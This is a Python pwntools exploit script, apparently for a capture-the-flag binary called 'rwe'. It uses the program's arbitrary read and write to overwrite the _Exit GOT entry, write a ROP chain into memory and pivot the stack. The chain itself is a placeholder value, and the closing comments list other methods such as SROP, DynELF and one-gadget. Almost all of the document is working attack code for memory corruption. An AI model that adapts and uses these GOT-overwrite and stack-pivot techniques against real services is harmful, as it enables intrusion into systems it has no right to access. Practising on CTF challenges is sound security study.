#!/usr/bin/python -i

from pwn import *

DEBUG = True
execname = './rwe'
remoteip = '0.0.0.0'
port = 12346

context.arch = 'amd64'

env = {}

USE_MY_LIBC = True

if USE_MY_LIBC:
    libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
else:
    libc_path = os.getcwd() + '/libc.so.6'
    env['LD_PRELOAD'] = libc_path

autoexec = 'python from libheap import *\n'

libc = ELF(libc_path)

system_offset = libc.symbols['system']
__libc_start_main_offset = libc.symbols['__libc_start_main']
puts_offset = libc.symbols['puts']

if DEBUG:
    r = process(execname, env=env)
    gdb.attach(r)
    raw_input('continue gdb ->')
    context.log_level = 'DEBUG'
else:
    r = remote(remoteip, port)

ret = 0x400286

main_nopush = 0x4005b7

pop6 = 0x40068a
pop_rsp_3reg = 0x40068d

__libc_start_main_gotentry = 0x601020
_Exit_gotentry = 0x601030


def readmem(addr):
    r.sendline(str(addr))
    return int(r.recvline()[2:].strip(), 16)


def writemem(addr, val):
    r.sendline(str(addr))
    r.sendline(str(val))


readmem(0x400000)
writemem(_Exit_gotentry, main_nopush)  # start over

rop = [0x123456789abcdef0]

stack_top = 0x601800

for i in range(len(rop)):
    readmem(0x400000)
    writemem(stack_top + i * 8, rop[i])

readmem(pop_rsp_3reg)
writemem(stack_top - 0x8 * 3, 0)

readmem(0x400000)
writemem(_Exit_gotentry, pop6)  # start over

# Magic gadget is possible
# you can read out every possible address including vdso.
# you can also dynelf
# you can srop since you can access to syscall
# you can rop directly if you choose the stack layout carefully
# you can also bruteforce the syscall
# _Exit must have some syscall nearby?
# you can move the stack to another address to do rop
